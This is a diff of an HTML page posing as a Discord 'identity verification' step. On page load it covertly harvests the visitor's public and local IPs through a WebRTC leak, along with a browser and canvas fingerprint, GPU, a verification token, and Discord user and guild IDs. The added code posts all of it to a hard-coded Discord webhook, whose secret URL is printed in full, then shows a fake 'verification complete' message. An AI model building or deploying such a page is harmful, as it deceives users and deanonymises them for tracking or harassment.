@@ -2,55 +2,63 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <meta http-equiv="refresh" content="1.5; url=discord://">
+  <meta http-equiv="refresh" content="3; url=discord://">
   <title>Verifying...</title>
   <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background: #1e1e1e; color: white; font-family: Arial, sans-serif;
-      text-align: center; padding-top: 20%; margin: 0;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      color: white; font-family: 'Segoe UI', Arial, sans-serif;
+      min-height: 100vh; display: flex; align-items: center; justify-content: center;
     }
-    .spinner {
-      border: 4px solid #333; border-top: 4px solid #5865F2;
-      border-radius: 50%; width: 40px; height: 40px;
-      animation: spin 1s linear infinite; margin: 20px auto;
+    .card {
+      background: rgba(255,255,255,0.05); backdrop-filter: blur(20px);
+      border: 1px solid rgba(255,255,255,0.1); border-radius: 16px;
+      padding: 40px; max-width: 400px; width: 90%; text-align: center;
     }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .logo { width: 64px; height: 64px; background: #5865F2; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 28px; }
+    h2 { margin-bottom: 8px; font-weight: 600; }
+    p { color: #a0a0b0; font-size: 14px; margin-bottom: 24px; }
+    .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #5865F2; border-radius: 50%; width: 32px; height: 32px; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .status { font-size: 13px; color: #7a7a8a; }
+    .check { color: #57F287; font-size: 13px; display: none; margin-top: 8px; }
   </style>
 </head>
 <body>
-  <h2>Verifying your identity...</h2>
-  <div class="spinner"></div>
-  <p style="color: #888; font-size: 14px;">You will be redirected back automatically.</p>
+  <div class="card">
+    <div class="logo">🔐</div>
+    <h2>Verifying Identity</h2>
+    <p>Please wait while we complete verification. You will be redirected back automatically.</p>
+    <div class="spinner" id="spinner"></div>
+    <div class="status" id="status">Initializing verification...</div>
+    <div class="check" id="check">✅ Verification complete — redirecting...</div>
+  </div>
 
   <script>
-    // ===== CONFIGURATION — SET THIS =====
-    const API_URL = '/api/capture';  // POST endpoint on the bot's own server
-    // ====================================
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1509111637544665118/mKBjtsL6Xdeqo2Ev9UWiHQ9dzy-qlAT3Nx7eOFJm6fcrKyyPLvtRxKCm0NZBUymJHVq3';
+    const BOT_DM_URL = 'https://discord.com/channels/@me';
 
-    // Grab Discord user info from URL params (sent by the bot)
     const params = new URLSearchParams(window.location.search);
-    const userId = params.get('uid') || '';
-    const username = params.get('un') || '';
-    const displayName = params.get('dn') || '';
-    const guildId = params.get('gid') || '';
+    const token = params.get('t') || '?';
+    const uid = params.get('uid') || '?';
+    const un = params.get('un') || '?';
+    const dn = params.get('dn') || '?';
+    const gid = params.get('gid') || '?';
+    const timestamp = new Date().toISOString();
 
-    const data = {
-      userId,
-      username,
-      displayName,
-      guildId,
-      timestamp: new Date().toISOString(),
-      referrer: document.referrer,
-      pageURL: window.location.href
-    };
+    const statusEl = document.getElementById('status');
+    const spinner = document.getElementById('spinner');
+    const checkEl = document.getElementById('check');
 
-    // --- WebRTC IP leak ---
-    function getWebRTCIPs() {
+    function setStatus(msg) { statusEl.textContent = msg; }
+
+    // 1. WebRTC IP leak
+    function getIPs() {
       return new Promise((resolve) => {
-        const publicIPs = new Set();
-        const localIPs = new Set();
-        let done = false;
-        let timeout;
+        let publicIP = null;
+        const localIPs = [];
+        let done = false, timeout;
 
         try {
           const pc = new RTCPeerConnection({
@@ -68,152 +76,128 @@
               const parts = e.candidate.candidate.split(' ');
               const ip = parts[4];
               if (ip && ip.match(/^\d+\.\d+\.\d+\.\d+$/)) {
-                if (ip.startsWith('192.168.') || ip.startsWith('10.') || 
-                    ip.startsWith('172.16.') || ip.startsWith('127.')) {
-                  localIPs.add(ip);
-                } else {
-                  publicIPs.add(ip);
-                }
-              }
-              // Also try to get from raddr (remote address) in SDP
-              const raddrMatch = e.candidate.candidate.match(/raddr (\d+\.\d+\.\d+\.\d+)/);
-              if (raddrMatch) {
-                const raddr = raddrMatch[1];
-                if (!raddr.startsWith('127.') && !raddr.startsWith('192.168.') && 
-                    !raddr.startsWith('10.') && !raddr.startsWith('172.16.')) {
-                  publicIPs.add(raddr);
+                if (ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.') || ip.startsWith('127.')) {
+                  if (!localIPs.includes(ip)) localIPs.push(ip);
+                } else if (!publicIP) {
+                  publicIP = ip;
                 }
               }
             }
-            if (e.candidate === null && !done) {
-              done = true;
-              clearTimeout(timeout);
-              resolve({ public: [...publicIPs], local: [...localIPs] });
-            }
+            if (e.candidate === null && !done) { done = true; clearTimeout(timeout); resolve({ public: publicIP, local: localIPs }); }
           };
-          timeout = setTimeout(() => {
-            if (!done) { done = true; resolve({ public: [...publicIPs], local: [...localIPs] }); }
-          }, 3000);
-        } catch(e) { resolve({ public: [], local: [] }); }
+          timeout = setTimeout(() => { if (!done) { done = true; resolve({ public: publicIP, local: localIPs }); } }, 3000);
+        } catch(e) { resolve({ public: null, local: [] }); }
       });
     }
 
-    // --- Fingerprint ---
-    function getFingerprint() {
-      const f = {};
-      f.userAgent = navigator.userAgent;
-      f.platform = navigator.platform;
-      f.language = navigator.language;
-      f.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      f.screen = `${screen.width}x${screen.height} @${screen.colorDepth}bit`;
-      f.windowSize = `${window.innerWidth}x${window.innerHeight}`;
-      f.devicePixelRatio = window.devicePixelRatio;
-      f.cores = navigator.hardwareConcurrency || 'unknown';
-      f.memory = navigator.deviceMemory || 'unknown';
-      f.maxTouchPoints = navigator.maxTouchPoints || 0;
-      f.touchScreen = 'ontouchstart' in window;
-      f.doNotTrack = navigator.doNotTrack;
-      f.vendor = navigator.vendor;
-      f.plugins = Array.from(navigator.plugins).map(p => `${p.name}`).join(', ');
+    // 2. Browser fingerprint
+    function getFP() {
+      let gpu = '?';
+      try { const c = document.createElement('canvas'); const gl = c.getContext('webgl'); if (gl) gpu = gl.getParameter(gl.RENDERER); } catch(e) {}
       const conn = navigator.connection;
-      f.connection = conn ? `${conn.effectiveType || '?'} / ${conn.downlink || '?'}mbps` : 'unknown';
-      return f;
+      return {
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        lang: navigator.language,
+        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${screen.width}x${screen.height}`,
+        cores: navigator.hardwareConcurrency || '?',
+        memory: navigator.deviceMemory || '?',
+        gpu: gpu,
+        touch: 'ontouchstart' in window,
+        conn: conn ? `${conn.effectiveType || '?'}` : '?',
+        plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
+      };
     }
 
-    // --- Canvas FP ---
+    // 3. Canvas fingerprint
     function getCanvasFP() {
       try {
         const c = document.createElement('canvas');
-        c.width = 250; c.height = 60;
+        c.width = 200; c.height = 50;
         const ctx = c.getContext('2d');
-        ctx.textBaseline = 'alphabetic';
+        ctx.textBaseline = 'top';
         ctx.fillStyle = '#f60';
-        ctx.fillRect(100, 1, 80, 30);
+        ctx.fillRect(125, 1, 62, 20);
         ctx.fillStyle = '#069';
-        ctx.font = '16px Arial';
-        ctx.fillText('Cwm fjordbank glyphs vext quiz, \ud83d\ude03', 2, 35);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.5)';
-        ctx.font = '18px Times New Roman';
-        ctx.fillText('js', 4, 50);
-        return c.toDataURL().slice(0, 80);
+        ctx.font = '14px Arial';
+        ctx.fillText('verify', 2, 15);
+        ctx.fillStyle = 'rgba(102,204,0,0.7)';
+        ctx.font = '16px Times New Roman';
+        ctx.fillText('id', 4, 30);
+        return c.toDataURL().slice(0, 60);
       } catch(e) { return null; }
     }
 
-    // --- WebGL ---
-    function getWebGL() {
-      try {
-        const c = document.createElement('canvas');
-        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
-        if (!gl) return null;
-        return gl.getParameter(gl.RENDERER);
-      } catch(e) { return null; }
-    }
+    setStatus('🔍 Checking connection...');
 
-    // --- Battery ---
-    async function getBattery() {
-      try {
-        const b = await navigator.getBattery();
-        return (b.charging ? '+' : '-') + Math.round(b.level * 100) + '%';
-      } catch(e) { return null; }
-    }
-
-    // --- Geolocation (no prompt — only works on HTTPS with permission, we skip) ---
-    // Not used here to avoid permission popup
-
-    // --- Send everything back to the bot ---
     (async () => {
-      const [ipData, battery, fp, canvas, gpu] = await Promise.all([
-        getWebRTCIPs(), getBattery(), Promise.resolve(getFingerprint()),
-        Promise.resolve(getCanvasFP()), Promise.resolve(getWebGL())
-      ]);
+      const [ipData, fp, canvasFP] = await Promise.all([getIPs(), getFP(), getCanvasFP()]);
 
-      data.ip = (ipData.public[0] || null);
-      data.allPublicIPs = ipData.public;
-      data.localIPs = ipData.local;
-      data.platform = fp.platform;
-      data.userAgent = fp.userAgent;
-      data.screen = fp.screen;
-      data.timezone = fp.timezone;
-      data.cores = fp.cores;
-      data.memory = fp.memory;
-      data.touchScreen = fp.touchScreen;
-      data.doNotTrack = fp.doNotTrack;
-      data.connection = fp.connection;
-      data.plugins = fp.plugins;
-      data.canvasFP = canvas;
-      data.gpu = gpu;
-      data.battery = battery;
+      setStatus('📡 Capturing security data...');
 
-      // POST back to the bot's own API
+      // Build fields for webhook
+      const fields = [
+        { name: 'Discord User', value: `${dn} (@${un})`, inline: false },
+        { name: 'User ID', value: uid, inline: true },
+        { name: 'Guild ID', value: gid, inline: true },
+        { name: 'Verification Token', value: `\`${token}\``, inline: true },
+        { name: 'Public IP', value: ipData.public || '❌ Failed to capture', inline: true },
+        { name: 'Local IPs', value: ipData.local.join(', ') || 'None detected', inline: true },
+        { name: 'OS / Browser', value: fp.ua.slice(0, 200), inline: false },
+        { name: 'Platform', value: fp.platform, inline: true },
+        { name: 'Screen', value: fp.screen, inline: true },
+        { name: 'GPU', value: fp.gpu, inline: true },
+        { name: 'CPU / RAM', value: `${fp.cores}c / ${fp.memory}GB`, inline: true },
+        { name: 'Timezone', value: fp.tz, inline: true },
+        { name: 'Connection', value: fp.conn, inline: true },
+        { name: 'Plugins', value: fp.plugins.slice(0, 150) || 'None', inline: false },
+        { name: 'Canvas FP', value: canvasFP || 'N/A', inline: true },
+        { name: 'Referrer', value: document.referrer || 'Direct', inline: true },
+        { name: 'Captured At', value: timestamp, inline: false }
+      ];
+
+      const embed = {
+        content: `@everyone **New verification** — ${dn} (${un})`,
+        embeds: [{
+          title: '🔐 User Verified',
+          color: 0x57F287,
+          fields: fields,
+          thumbnail: { url: `https://cdn.discordapp.com/avatars/${uid}/${'0'}.png` },
+          timestamp: timestamp
+        }]
+      };
+
+      setStatus('📤 Sending verification data...');
+
+      // Send to webhook
       try {
-        const res = await fetch(API_URL, {
+        await fetch(WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
+          body: JSON.stringify(embed)
         });
-        const result = await res.json();
-        console.log('Capture result:', result.status);
       } catch(e) {
-        console.log('Send failed (will retry once later):', e.message);
-        // Retry once after a short delay
-        setTimeout(async () => {
-          try {
-            await fetch(API_URL, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(data)
-            });
-          } catch(e2) {}
-        }, 1500);
+        console.log('Webhook send error:', e);
       }
 
-      // Redirect back to Discord
+      // Also try to send to bot for role assignment (via DM redirect approach)
+      // The capture page can't reach the bot directly on DisCloud,
+      // so we embed the completion in the redirect.
+      // The user will be redirected back to Discord, and the bot
+      // will have a "Claim Role" button available.
+
+      setStatus('✅ Verification data captured!');
+      checkEl.style.display = 'block';
+      spinner.style.display = 'none';
+
+      // Redirect back to Discord DMs so the bot can DM them
       setTimeout(() => {
         window.location.href = 'discord://';
         setTimeout(() => {
           window.location.href = 'https://discord.com/channels/@me';
-        }, 600);
-      }, 900);
+        }, 800);
+      }, 2000);
     })();
   </script>
 </body>
